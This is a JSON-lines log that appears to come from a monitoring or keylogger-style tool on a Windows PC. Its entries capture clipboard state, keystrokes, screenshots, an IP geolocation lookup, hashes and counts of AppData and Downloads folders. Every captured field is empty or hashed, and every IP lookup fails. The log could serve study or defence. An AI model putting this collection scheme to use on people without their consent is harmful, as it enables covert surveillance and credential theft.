{"timestamp": "2025-06-14T07:24:21.009009+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d4b00a6326fd6b5c275b8380ea41db79cd2f13eedad391460cc5acf4dec33dbd", "_raw_log_hash": "050f3c9246d44aa8362bad0e75c61b9b09ad0eae830231570d440e6ac251fe61"}
{"timestamp": "2025-06-14T07:24:34.522664+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "967b57943df437aca9dd63d0c3d7d66f298882835d06b3905205b06d67e39f34", "_raw_log_hash": "8a1aa7d3eadaeee5ceb9d296770e620734bf82d78ad797521f49f8a72f5a9f6a"}
{"timestamp": "2025-06-14T07:24:48.035948+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e7417caddbcca70b6c51ca7b16d9bf40c34efa6dd18bc2e7684e0fc23d3ade0b", "_raw_log_hash": "c3e510cda1995eeb27a5a83fbc692b901f424e57ecf6cd213b772c6e4074d34b"}
{"timestamp": "2025-06-14T07:25:01.944251+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b9643afdab25b70b08abc43e3f946ac17bb8ece898cfbb939b4b22f0021e8204", "_raw_log_hash": "8f3e988363735af1961cf64f7b1f57649f569b270cce5a375744ff5a40402617"}
{"timestamp": "2025-06-14T07:25:15.430273+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4c00d9f1ba5273a2395b063fba19fde2d046dcc05f365271ce7b7b74f5230c36", "_raw_log_hash": "bc4789433a86cb7ee9890bfd9592a62f5e654ea196b1085a86215b0249e71ec4"}
{"timestamp": "2025-06-14T07:25:28.935174+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "82944e0f32e20793561c54445059358a45e803de62a64ae5437e78120ae84583", "_raw_log_hash": "fdba59e488782d356d7a1197f5b1c5973d49e5cf43cb9400e46fcdea42b21c7a"}
{"timestamp": "2025-06-14T07:25:42.445031+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "19af79e13a1d5cf6a97728b716f8efe9e97f17099a510e035f0a31340bc1bb71", "_raw_log_hash": "80eddd87e1500ec64b06d017eb297ad9ab86f910161e9b9e8163c5c89339d9a7"}
{"timestamp": "2025-06-14T07:25:55.989903+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "818d3a0339fb75b0068da47e6cf5c5d1b4f9c189148c696bd24fd3ce508de0bd", "_raw_log_hash": "bcaffddb8809d735e75f1b501edb09e961df97bb6cbad95b23ef2b500db5a4f2"}
{"timestamp": "2025-06-14T07:26:09.567428+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d7f8dccd329b4bdca45a71b67c47a5299c8a3dde4ac938c5733fb6eff586e3ef", "_raw_log_hash": "803a419d02f90e2cd00d3fcc0f234e6aa24e226542b4cbfda2efe47d2ae61ca9"}
{"timestamp": "2025-06-14T07:26:23.160134+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9b789fc1cbd970a722f14030eae669126d6422fcf28fde0fb2f529190d56ccc5", "_raw_log_hash": "dd4d03e3793524d4ca6af0d21158c4970e747f35d6d1a6d95fc8f68c00b61dd3"}
{"timestamp": "2025-06-14T07:26:36.682477+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59fb8beb76bac61ab0f248fe7681ff33e9e3aa9ca84eba29f220695cfefc28a4", "_raw_log_hash": "4a436c068893cd114a4ec162f058cb45d75c04256e6ea028cef446c866d1c0ab"}
{"timestamp": "2025-06-14T07:26:50.279895+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2105b9fc899164a0bdbcb26b608f65a6268ddb4379969213d5f686aa0ec4a918", "_raw_log_hash": "57e9e9d57f80d52e0196a665c915dd00604c31cd17d2ab67d067e5c2de15ace3"}
{"timestamp": "2025-06-14T07:27:03.759480+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "46c584aa73d6aa77af07af2e9a4fa9e6d7af479f9819910ab703a2882ffd5676", "_raw_log_hash": "c1c1d0f82e8b35b6a5864067d07d86e8cd476e2365101a1954dea2f89e7dda70"}
{"timestamp": "2025-06-14T07:27:17.248142+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "165c6d3222acf4ff3f2df0f83193c5e22049a11297f04ccacf60234f3ee5dc33", "_raw_log_hash": "197fc7a048583473b8389d3d0c157dfe48557f5cd640d1b2b13061ddea5e3d2f"}
{"timestamp": "2025-06-14T07:27:30.789077+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "73e784f0e96f51ff1d6840d28a03da185fd39c7e36806aa0a4086298e4c1db20", "_raw_log_hash": "5280923f1bfa083067e6910aa55f9603f3d91448e57f2768a72b59867f78b435"}
{"timestamp": "2025-06-14T07:27:44.391224+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ed70ed12a14acd612261fae7e02045b72b5be1583d964d8c5bac2fd46ae6dba5", "_raw_log_hash": "49aa0ead9a5642d62d4e7f0c3321f5e3ca734ca0faa73f6587fb1ba1983229e6"}
{"timestamp": "2025-06-14T07:27:57.923939+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6d58cf6e254dfefbdbc6b124df350b1201e64df0d960252ac067fd22a957e64d", "_raw_log_hash": "9137e4da56147ad3d55a0c619cb2d577fa498530016cce8438c4ca579ebdc880"}
{"timestamp": "2025-06-14T07:28:11.458222+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2bc43d1255f29118c3da4e3444b14f89140071d52ff2a16a498634756e9b7d13", "_raw_log_hash": "b47686e806cd77d51a39edfd142dc94ebbf34984d028843034ad592c93c3d4d4"}
{"timestamp": "2025-06-14T07:28:24.932842+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "184f71985f76fd2d2fabd7b6b7a57949b5a879921afffb5e552de68f8af81311", "_raw_log_hash": "d1d3938212ce6b332a845c8bda9cb2f465d61e045bb5ffa6259072af6ab7eec0"}
{"timestamp": "2025-06-14T07:28:38.403869+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3ad78f3412731d6d44b653991f0cfcc47cd645b954d1cfcb5d9f7cbf1fcad49a", "_raw_log_hash": "52e3b490a801dd29bcb28cf244a7217536c0c6945e85c344c5c7e41cbd2425e1"}
{"timestamp": "2025-06-14T07:28:51.972630+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e135c4607e17e002b2bdf366b3be8af602f5d9bdae91f2a32f8b578e1ae56af7", "_raw_log_hash": "dcfb401386dd63c6fbc55d4a500aa07e8d29bbf8a5fea5ad8c9b17fc058d2327"}
{"timestamp": "2025-06-14T07:29:05.469195+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3b04fa37a4c9dda74d56bbeacb324390b705a723df61c2d4d03d002aaf7f415b", "_raw_log_hash": "4f5ce2a1c1d8306ab7575e0678c94b297dd1c8030ff7e16544c50e9dee9e1300"}
{"timestamp": "2025-06-14T07:29:19.030866+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "abea072f93378abf3fdb3c6a70645bfb3a1d56f741d2b5b55489a0dfaf0aa2ab", "_raw_log_hash": "99c11f791f0f3884642f628f439c8092d75bdeda28a1b5136e79b663ce5b3cf5"}
{"timestamp": "2025-06-14T07:29:32.594962+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3698d0addb22c8be66ebf463d75cff0b01ab41cca28e8495c9bf9f89abaca0ff", "_raw_log_hash": "f7fae8271ab0b4658cd9a2222687942c633854cdf38d7bcb38246dc55d44769a"}
{"timestamp": "2025-06-14T07:29:46.122302+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1ff569fa1b40589eaf1fd718c159addb80f316abf3a242c5affbe2cf6fd9a8c7", "_raw_log_hash": "0de5b0485a278c9d626915de7f7785226c57b9880922937e3bfed24e75c23daa"}
{"timestamp": "2025-06-14T07:29:59.692586+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "406441a83ed8981db1cbba1dda5145733607228202f500e3d0306016ce35a6eb", "_raw_log_hash": "aeca1fb155f56ebd3f29e4d23d1ba4becfa90f0aedf7aaa84c75baa70ad2d954"}
